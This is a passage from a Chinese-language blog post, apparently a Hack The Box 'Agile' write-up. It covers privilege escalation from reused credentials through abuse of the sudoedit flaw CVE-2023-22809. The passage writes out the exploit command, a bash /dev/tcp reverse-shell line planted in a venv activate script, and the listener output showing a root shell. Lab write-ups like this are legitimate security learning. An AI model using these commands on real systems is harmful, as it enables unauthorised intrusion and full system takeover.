+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>agile<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>edwards<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>d07867c6267dcb5df0af<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>twitter<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>dedwards__<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>7dbfe676b6b564ce5718<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>37、这里是发现了2个账号的密码，登录其中一个开始尝试。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs perl">┌──(kali㉿offsec)-[~<span class="hljs-regexp">/Desktop]</span><br><span class="hljs-regexp">└─$ ssh edwards@10.10.11.203</span><br><span class="hljs-regexp">edwards@10.10.11.203&#x27;s password: </span><br><span class="hljs-regexp">Welcome to Ubuntu 22.04.2 LTS (GNU/</span>Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">60</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-regexp">//</span>help.ubuntu.com<br> * Management:     https:<span class="hljs-regexp">//lands</span>cape.canonical.com<br> * Support:        https:<span class="hljs-regexp">//u</span>buntu.com/advantage<br><br>This <span class="hljs-keyword">system</span> has been minimized by removing packages <span class="hljs-keyword">and</span> content that are<br><span class="hljs-keyword">not</span> required on a <span class="hljs-keyword">system</span> that users <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">log</span> into.<br><br>To restore this content, you can run the <span class="hljs-string">&#x27;unminimize&#x27;</span> command.<br>Failed to <span class="hljs-keyword">connect</span> to https:<span class="hljs-regexp">//</span>changelogs.ubuntu.com/meta-release-lts. Check your Internet connection <span class="hljs-keyword">or</span> proxy settings<br><br><br>The programs included with the Debian GNU/Linux <span class="hljs-keyword">system</span> are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> program are described in the<br>individual files in /usr/share/doc/*<span class="hljs-regexp">/copyright.</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">Debian GNU/</span>Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br><br>Last login: Thu Mar  <span class="hljs-number">2</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span>:<span class="hljs-number">51</span> <span class="hljs-number">2023</span> from <span class="hljs-number">10.10</span>.<span class="hljs-number">14.23</span><br>edwards@agile:~$ id<br>uid=<span class="hljs-number">1002</span>(edwards) gid=<span class="hljs-number">1002</span>(edwards) groups=<span class="hljs-number">1002</span>(edwards)<br>edwards@agile:~$<br></code></pre></td></tr></table></figure>
+
+<p>38、这里发现，可以调到另一个用户的sudo权限</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs tap">edwards@agile:~$ ls -la<br>total 32<br>drwxr-x---<span class="hljs-number"> 5 </span>edwards edwards<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root    root   <span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>..<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root    root      <span class="hljs-number"> 9 </span>Feb <span class="hljs-number"> 6 </span><span class="hljs-number"> 2023 </span>.bash_history -&gt; /dev/null<br>-rw-r--r--<span class="hljs-number"> 1 </span>edwards edwards <span class="hljs-number"> 220 </span>Jan <span class="hljs-number"> 6 </span><span class="hljs-number"> 2022 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>edwards edwards<span class="hljs-number"> 3771 </span>Jan <span class="hljs-number"> 6 </span><span class="hljs-number"> 2022 </span>.bashrc<br>drwx------<span class="hljs-number"> 2 </span>edwards edwards<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.cache<br>drwxr-xr-x<span class="hljs-number"> 3 </span>edwards edwards<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.config<br>drwx------<span class="hljs-number"> 3 </span>edwards edwards<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.local<br>-rw-r--r--<span class="hljs-number"> 1 </span>edwards edwards <span class="hljs-number"> 807 </span>Jan <span class="hljs-number"> 6 </span><span class="hljs-number"> 2022 </span>.profile<br>edwards@agile:~$ <br>edwards@agile:~$ sudo -l <br>[sudo] password for edwards: <br>Matching Defaults entries for edwards on agile:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User edwards may run the following commands on agile:<br>    (dev_admin : dev_admin) sudoedit /app/config_test.json<br>    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt<br>edwards@agile:~$ <br></code></pre></td></tr></table></figure>
+
+<p>39、执行利用</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">edwards@agile:~$ sudo -u dev_admin sudoedit /app/config_test.json</span><br><span class="hljs-section">sudo: sudoedit doesn&#x27;t need to be run via sudo</span><br><span class="hljs-section">sudo: /app/config_test.json unchanged</span><br><span class="hljs-section">edwards@agile:~$ </span><br><br>&#123;<br>    <span class="hljs-string">&quot;SQL_URI&quot;</span>: <span class="hljs-string">&quot;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&quot;</span><br>&#125;<br><br><br><span class="hljs-section">edwards@agile:~$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt</span><br><span class="hljs-section">sudo: sudoedit doesn&#x27;t need to be run via sudo</span><br><span class="hljs-section">sudo: /app/app-testing/tests/functional/creds.txt unchanged</span><br><span class="hljs-section">edwards@agile:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>40、上面是发现了一些账号密码，但是根据引导，还是发现了一些途径的</p>
+<p>41、那就是查看sudo的版本</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">edwards</span>@agile:~$ sudo -V<br><span class="hljs-attribute">Sudo</span> version <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sudoers</span> policy plugin version <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sudoers</span> file grammar version <span class="hljs-number">48</span><br><span class="hljs-attribute">Sudoers</span> I/O plugin version <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sudoers</span> audit plugin version <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">edwards</span>@agile:~$ <br></code></pre></td></tr></table></figure>
+
+<p>42、搜索漏洞</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">9</span> exploit github<br><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2023</span>-<span class="hljs-number">22809</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/27.png" srcset="/img/loading.gif" lazyload></p>
+<p>43、开始执行利用</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs tap">EDITOR=&#x27;vim -- /app/venv/bin/activate&#x27; sudoedit -u dev_admin -g dev_admin /app/config_test.json<br><br><br>head /app/venv/bin/activate<br><span class="hljs-comment"># This file must be used with &quot;source bin/activate&quot; *from bash*</span><br><span class="hljs-comment"># you cannot run it directly</span><br>bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.12/443 0&gt;&amp;1&#x27;<br><br>deactivate () &#123;<br>    <span class="hljs-comment"># reset old environment variables</span><br>    if [ -n &quot;$&#123;_OLD_VIRTUAL_PATH:-&#125;&quot; ] ; then<br>        PATH=&quot;$&#123;_OLD_VIRTUAL_PATH:-&#125;&quot;<br>        export PATH<br>        unset _OLD_VIRTUAL_PATH<br><br><br><br>edwards@agile:~$ ls -lh /app/venv/bin<br>total 1.4M<br>-rw-r--r--<span class="hljs-number"> 1 </span>root dev_admin 8.9K Sep<span class="hljs-number"> 30 </span>08:51 Activate.ps1<br>-rw-rw-r--<span class="hljs-number"> 1 </span>root dev_admin 2.0K Sep<span class="hljs-number"> 30 </span>08:51 activate<br>-rw-r--r--<span class="hljs-number"> 1 </span>root dev_admin <span class="hljs-number"> 902 </span>Sep<span class="hljs-number"> 30 </span>08:51 activate.csh<br>-rw-r--r--<span class="hljs-number"> 1 </span>root dev_admin 2.0K Sep<span class="hljs-number"> 30 </span>08:51 activate.fish<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 213 </span>Sep<span class="hljs-number"> 30 </span>08:51 flask<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 222 </span>Jan<span class="hljs-number"> 24 </span><span class="hljs-number"> 2023 </span>gunicorn<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 226 </span>Sep<span class="hljs-number"> 30 </span>08:51 pip<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 226 </span>Sep<span class="hljs-number"> 30 </span>08:51 pip3<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 226 </span>Sep<span class="hljs-number"> 30 </span>08:51 pip3.10<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 226 </span>Sep<span class="hljs-number"> 30 </span>08:51 py.test<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 226 </span>Sep<span class="hljs-number"> 30 </span>08:51 pytest<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root        <span class="hljs-number"> 7 </span>Sep<span class="hljs-number"> 30 </span>08:51 python -&gt; python3<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root       <span class="hljs-number"> 16 </span>Sep<span class="hljs-number"> 30 </span>08:51 python3 -&gt; /usr/bin/python3<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root        <span class="hljs-number"> 7 </span>Sep<span class="hljs-number"> 30 </span>08:51 python3.10 -&gt; python3<br>-rwxrwxr-x<span class="hljs-number"> 1 </span>root root      1.3M Jan<span class="hljs-number"> 23 </span><span class="hljs-number"> 2023 </span>uwsgi<br>edwards@agile:~$ <br><br>edwards@agile:~$ EDITOR=&#x27;vim -- /app/venv/bin/activate&#x27; sudoedit -u dev_admin /app/config_test.json <br>sudoedit: --: Permission denied<br>2 files to edit<br>sudoedit: /app/config_test.json unchanged<br>edwards@agile:~$ <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/28.png" srcset="/img/loading.gif" lazyload></p>
+<p>44、到这里就获取到了反弹shell了，并读取到最终的flag信息</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 443<br>listening on [any] 443 <span class="hljs-built_in">..</span>.<br>connect <span class="hljs-keyword">to</span> [10.10.14.12] <span class="hljs-keyword">from</span> (UNKNOWN) [10.10.11.203] 40908<br>bash: cannot <span class="hljs-built_in">set</span> terminal process<span class="hljs-built_in"> group </span>(2794): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>root@agile:~# id<br>id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br>root@agile:~# cat /root/root.txt<br>cat /root/root.txt<br>42721be4ede62508404ba6007c390820<br>root@agile:~# <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/532</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Aglie-htb-writeup</div>
+      <div>https://sh1yan.top/2024/09/30/Aglie-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/10/Outdated-htb-writeup/" title="Outdated-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Outdated-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/26/Driver-htb-writeup/" title="Driver-htb-writeup">
+                        <span class="hidden-mobile">Driver-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
